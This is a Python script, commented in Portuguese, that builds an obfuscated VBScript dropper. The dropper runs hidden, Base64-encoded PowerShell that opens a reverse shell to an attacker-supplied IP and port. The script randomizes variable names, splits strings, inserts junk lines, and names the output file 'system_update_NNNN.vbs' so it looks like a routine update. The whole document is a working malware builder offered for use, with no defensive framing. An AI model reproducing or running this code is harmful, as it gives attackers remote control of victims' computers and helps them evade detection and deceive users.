import base64
import random

def random_name(prefix='var'):
    return prefix + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))

def random_chr(char):
    return f"Chr({ord(char)})" if random.choice([True, False]) else f'"{char}"'

def generate_vbs_reverse_shell(ip, port):
    # Variáveis aleatórias
    var_shell = random_name('obj')
    var_quote = random_name('chr')
    var_temp = random_name('tmp')
    
    # Gerar código PowerShell e converter para Base64
    ps_code = f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1 | Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$b2=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b2,0,$b2.Length);$s.Flush()}};$c.Close()"
    ps_base64 = base64.b64encode(ps_code.encode('utf-16le')).decode('utf-8')
    
    # Gerar código VBS válido com ofuscação controlada
    vbs_code = f'''Option Explicit
Dim {var_quote}, {var_shell}, {var_temp}

' Inicialização de variáveis
{var_quote} = Chr(34)
{var_temp} = "WScr" & "ipt.She" & "ll"

' Criação do objeto
Set {var_shell} = CreateObject({var_temp})

' Execução do comando
{var_shell}.Run "powershell -w hidden -nop -e {ps_base64}", 0, False
'''
    
    # Adicionar lixo aleatório seguro
    junk = [
        "' " + "".join(random.choices("abcdefghijklmnopqrstuvwxyz ", k=30)),
        f"On Error Resume Next",
        f"If Err.Number <> 0 Then Err.Clear"
    ]
    
    lines = vbs_code.split('\n')
    lines.insert(3, random.choice(junk))
    lines.insert(6, random.choice(junk))
    
    return '\n'.join(lines)

def main():
    print("Gerador Confiável de Shell Reversa VBS")
    ip = input("IP de destino: ").strip()
    port = input("Porta: ").strip()
    
    try:
        vbs_code = generate_vbs_reverse_shell(ip, port)
        filename = f"system_update_{random.randint(1000,9999)}.vbs"
        
        with open(filename, 'w') as f:
            f.write(vbs_code)
            
        print(f"\n[+] Arquivo gerado: {filename}")
        print("[+] Técnicas de ofuscação aplicadas:")
        print(f" - Nomes de variáveis aleatórios")
        print(f" - Strings fragmentadas")
        print(f" - Comentários aleatórios")
        print(f" - Código PowerShell ofuscado em Base64")
        
    except Exception as e:
        print(f"\n[-] Erro ao gerar arquivo: {str(e)}")

if __name__ == "__main__":
    main()